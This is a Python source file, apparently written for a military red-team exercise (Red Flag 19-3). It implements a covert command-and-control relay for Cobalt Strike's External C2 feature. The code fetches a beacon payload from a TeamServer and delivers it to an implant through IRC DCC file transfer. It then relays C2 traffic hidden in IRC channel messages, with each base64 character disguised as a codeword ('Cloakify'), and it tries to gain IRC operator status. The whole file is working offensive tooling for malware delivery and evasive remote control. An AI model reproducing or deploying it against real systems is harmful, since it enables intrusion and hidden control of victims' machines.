"""
    IRCServ.py
    by Lt Daniel Fitzgerald
    Red Flag 19-3 - July 2019

    Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
"""
import base64
import datetime
import ipaddress
import socket
import struct
import sys
import time

# List of Base64 characters
B64List = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=")
# List of strings for Cloakify
CipherList = [
    "apple",
    "bob",
    "carrot",
    "dessert",
    "eagle",
    "fan",
    "good",
    "happy",
    "ice",
    "juice",
    "kiwi",
    "lucky",
    "mini",
    "nickle",
    "open",
    "process",
    "query",
    "recursive",
    "sort",
    "truncate",
    "under",
    "vacate",
    "window",
    "xxx",
    "yellow",
    "zebra",
    "Alpha",
    "Bravo",
    "Charlie",
    "Delta",
    "Echo",
    "Foxtrot",
    "Golf",
    "Hotel",
    "India",
    "Julliett",
    "Kilo",
    "Lima",
    "Mike",
    "November",
    "Oscar",
    "Papa",
    "Qubec",
    "Romeo",
    "Sierra",
    "Tango",
    "Uniform",
    "Victor",
    "Whisky",
    "XRay",
    "Yankee",
    "Zulu",
    "zero",
    "one",
    "two",
    "three",
    "four",
    "five",
    "six",
    "seven",
    "eight",
    "nine",
    "slash",
    "plus",
    "equal"
]


class IRCinfo:
    """
    @brief Class to hold info for IRC session
    """
    def __init__(self, src_ip, ip, port, nick, password, user, real_name, channel, client_nick):
        """

        :param ip: IP address of IRC server
        :param port: Port of IRC server
        :param nick: NICK program will connect as
        :param password: PASS program will use
        :param user: USER program will connect as
        :param real_name: REALNAME program will connect as (optional in IRC)
        :param channel: CHANNEL program will auto-join
        :param client_nick: NICK program will send data to (should be NICK C2 client connected as)
        """
        self.src_ip = src_ip
        self.ip = ip
        self.port = port
        self.nick = nick
        self.password = password
        self.user = user
        self.real_name = real_name
        self.channel = channel
        self.client_nick = client_nick


class ExternalC2Controller:
    """
    @brief Main ExternalC2 controller class
    """
    def __init__(self, port):
        """

        :param port: Port to connect to TeamServer
        """
        self.port = port

    def encode_frame(self, data):
        """

        :param data: Data to send to client or TeamServer
        :return: Data packed in ExternalC2 format and ready to send
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """

        :param data: Data packed in ExternalC2 format
        :return: Length of unpacked data, Unpacked data
        """
        datalen = struct.unpack("<I", data[0:3])
        body = data[4:]
        return datalen, body

    def cloakify(self, char):
        """

        :param char: Base64 character to turn into cloakified string
        :return: Cloakified string or None if failed to map to string
        """
        for b64char in B64List:
            if char == b64char:
                index = B64List.index(char)
                return CipherList[index]
        return None

    def decloakify(self, cloakstr):
        """

        :param cloakstr: Cloakfied string
        :return: Base64 character of cloakified string or None if failed to map to B64 character
        """
        for string in CipherList:
            if cloakstr == string:
                index = CipherList.index(cloakstr)
                return B64List[index]
        return None

    def base64(self, msg):
        """

        :param msg: String to encode in Base64
        :return: Base64 encoded string (in bytes)
        """
        b64msg = base64.b64encode(msg)
        return b64msg

    def debase64(self, b64msg):
        """

        :param b64msg: Base64 string to be decoded
        :return: Decoded string
        """
        msg = base64.b64decode(b64msg)
        return msg

    def send_to_irc(self, text):
        """

        :param text: Formatted message to send to IRC Server
        :return: Number of bytes sent
        """
        time.sleep(0.05)
        return self._socketBeacon.sendall(text.encode())

    def recv_from_irc(self):
        """

        :return: Decoded string received from IRC Server
        """
        return self._socketBeacon.recv(1024).decode()

    def send_to_ts(self, data):
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        data = bytearray()
        _len = self._socketTS.recv(4)
        datalen = struct.unpack("<I", _len)[0]
        while len(data) < datalen:
            data += self._socketTS.recv(datalen - len(data))
        
        return data

    def equalcheck(self, b64msg):
        """

        :param b64msg: Base64 string
        :return: Base64 string with == at end of it
        """
        if b64msg.find("==") != -1:
            return b64msg
        elif b64msg.find("=") != -1:
            b64msg += "="
            return b64msg
        else:
            b64msg += "=="
            return b64msg

    def send_to_beacon(self, data, ircinfo):
        """

        :param data: Cloakified string to send to IRC Server
        :param ircinfo: Class with users IRC info
        """
        frame = self.encode_frame(data)
        # frame = data
        # print("Sending Client :{}".format(frame))
        chanmsg = "PRIVMSG {} :Sending frame\r\n".format(ircinfo.channel)
        self.send_to_irc(chanmsg)
        b64msg = self.base64(frame).decode()
        b64msg = self.equalcheck(b64msg)
        # print("B64msg is :{}".format(b64msg))
        # chanb64msg = "PRIVMSG {} :Sending encoded msg {}\r\n".format(ircinfo.channel, b64msg)
        # self.send_to_irc(chanb64msg)
        for char in b64msg:
            # print("B64 char: {}".format(char))
            cloakstr = self.cloakify(char)
            # print("cloakstr: {}".format(cloakstr))
            now = datetime.datetime.now()
            irccloakstr = "PRIVMSG {} :T-{:02d}:{:02d}:{:02d}-{}\r\n".format(ircinfo.channel, now.hour, now.minute,
                                                                             now.second, cloakstr)
            self.send_to_irc(irccloakstr)

    def recv_from_beacon(self, beacon_data):
        """

        :param beacon_data:
        :return:
        """
        data = ""
        _len = beacon_data[:4]
        datalen = struct.unpack("<I", _len)[0]
        data = beacon_data[4:]
        return data

    def ping_check(self, data):
        """

        :param data: String received from IRC Server
        """
        if data.find("PING :") != -1:
            pingsvr = data[5:]
            pong = "PONG {}".format(pingsvr)
            self.send_to_irc(pong)

    def connect_to_irc(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        time.sleep(1)
        password = "PASS {}\r\n".format(ircinfo.password)
        self.send_to_irc(password)
        nick = "NICK {}\r\n".format(ircinfo.nick)
        self.send_to_irc(nick)
        user = "USER {} {} {} :{}\r\n".format(ircinfo.user, "0", "*", ircinfo.real_name)
        self.send_to_irc(user)
        while True:
            data = self.recv_from_irc()
            print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("MODE ") != -1:
                print("Connection done?")
                break

        userhost = "USERHOST {}\r\n".format(ircinfo.user)
        self.send_to_irc(userhost)
        data = self.recv_from_irc()
        print("From IRC Server: {}".format(data))
        
    def dcc_listen(self, ircinfo, port):
        self._socketDCC = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketDCC.bind((ircinfo.src_ip, port))
        self._socketDCC.settimeout(60.0)
        try:
            self._socketDCC.listen(1)
        except socket.timeout:
            print("Didn't receive connection from client in time! (60 sec)")
            self._socketDCC.close()
            return False
        
        self._socketDCCConn = self._socketDCC.accept()[0]
        print("Received DCC connection")
        return True

    def dcc_send(self, filename, filesize, port, ircinfo):
        dcc_notice = "NOTICE {} :DCC Send {} ({})\r\n".format(ircinfo.client_nick, filename, ircinfo.src_ip)
        dcc_send = "PRIVMSG {} :\01DCC SEND {} {} {} {}\01\r\n"\
            .format(ircinfo.client_nick, filename, int(ipaddress.IPv4Address(ircinfo.src_ip)), port, filesize)
        self.send_to_irc(dcc_notice)
        self.send_to_irc(dcc_send)
        return self.dcc_listen(ircinfo, port)

    def join_channel(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        join = "JOIN {}\r\n".format(ircinfo.channel)
        self.send_to_irc(join)

    def become_oper(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        oper = "OPER {} {}\r\n".format(ircinfo.client_nick, ircinfo.password)
        self.send_to_irc(oper)

    def wait_for_client(self, ircinfo):
        """

        :return: True if cloak message is seen, False if Closing Link message is seen
        """
        while True:
            data = self.recv_from_irc()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("PRIVMSG ") != -1:
                cloak = "PRIVMSG {} :cloak".format(ircinfo.channel)
                if data.find(cloak) != -1:
                    return True

                quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
                quitmsg = "QUIT :\r\n"
                chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
                if data.find(chanexit) != -1:
                    self.send_to_irc(quitting)
                    self.send_to_irc(quitmsg)
                    return False            

            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return False

    def run(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        :return: 1 on error
        """
        # First thing, wait for a connection from our custom beacon
        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socketBeacon.connect((ircinfo.ip, ircinfo.port))

        self.connect_to_irc(ircinfo)
        self.join_channel(ircinfo)
        self.become_oper(ircinfo)
        
        if self.wait_for_client(ircinfo):
            print("Received C2 connection")
        else:
            print("Link Closed.")
            return False

        # Now we have a beacon connection, we kick off comms with CS External C2
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketTS.connect(("127.0.0.1", self.port))

        # Send out config options
        self.send_to_ts("arch=x86".encode())
        self.send_to_ts("pipename=mIRC".encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our custom beacon
        data = self.recv_from_ts()
        # data = "payload"

        # Client is connected to IRC, now transfer beacon via DCC
        if self.dcc_send("filetransfer.txt", len(data), 1024, ircinfo):
            self._socketDCCConn.sendall(self.encode_frame(data))
            self._socketDCCConn.close()
            self._socketDCC.close()
        else:
            return False

        cloakmsg = "PRIVMSG {} :T-".format(ircinfo.channel)
        chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
        pmexit = "PRIVMSG {} :exit".format(ircinfo.nick)
        quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
        quitmsg = "QUIT :\r\n"
        while True:
            # print("Sending frame")
            # self.send_to_beacon(data, ircinfo)

            print("Recv...")
            b64msg = ""
            flag = 0
            while True:
                data = self.recv_from_irc()
                if len(data) != 0:
                    print("From IRC Server: {}".format(data))

                self.ping_check(data)

                if data.find("PRIVMSG ") != -1:
                    offset = data.find(cloakmsg)
                    if offset != -1:
                        # 'HH:MM:SS-' is 9 characters
                        offset += len(cloakmsg) + 9
                        # -2 to strip \r\n
                        cloakstring = data[offset:-2]
                        # print("Cloakstring:|{}|".format(cloakstring))
                        b64char = self.decloakify(cloakstring)
                        if b64char is None:
                            print("Error: non-cipherarray string: |{}|".format(cloakstring))
                        else:
                            b64msg += b64char
                            if b64char == "=" and flag == 0:
                                flag = 1
                            elif b64char == "=" and flag == 1:
                                # print("Base64 message: {}".format(b64msg))
                                chanb64msg = "PRIVMSG {} :Recv encoded msg\r\n".format(ircinfo.channel)
                                self.send_to_irc(chanb64msg)
                                msg = self.debase64(b64msg)
                                # print("Message: {}".format(msg))
                                chanmsg = "PRIVMSG {} :Recv msg\r\n".format(ircinfo.channel)
                                self.send_to_irc(chanmsg)
                                data = self.recv_from_beacon(msg)
                                # data = "The quick brown fox jumps over a lazy dog.1234567890!"
                                break

                    if data.find(chanexit) != -1 or data.find(pmexit) != -1:
                        self.send_to_irc(quitting)
                        self.send_to_irc(quitmsg)

                if data.find("ERROR") != -1:
                    print("Server sent error.")
                    if data.find("Closing Link"):
                        print("Error was to close link!")
                        return False
            print("Recv frame")

            print("Sending to TS")
            self.send_to_ts(data)

            print("Recv TS...")
            data = self.recv_from_ts()

            print("Sending frame")
            self.send_to_beacon(data, ircinfo)


if len(sys.argv) != 10:
    print("Number of args passed: {}".format(len(sys.argv)))
    print("Args: {}".format(str(sys.argv)))
    print("Incorrect number of args: \"[SRC_IP]\" \"[IP]\" \"[PORT]\" \"[NICK]\" \"[PASS]\" \"[USER]\" \"[REAL_NAME]\""
          " \"[CHANNEL]\" \"[CLIENT_NICK]\"")
else:
    controller = ExternalC2Controller(2222)
    # ircinfo = IRCinfo("192.168.136.130", "192.168.136.128", 6667, "servbot", "bot", "covertserv", "covertIRCserv",
    #                   "#bot", "bot")
    ircinfo = IRCinfo(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], 
                      sys.argv[8], sys.argv[9])
    controller.run(ircinfo)
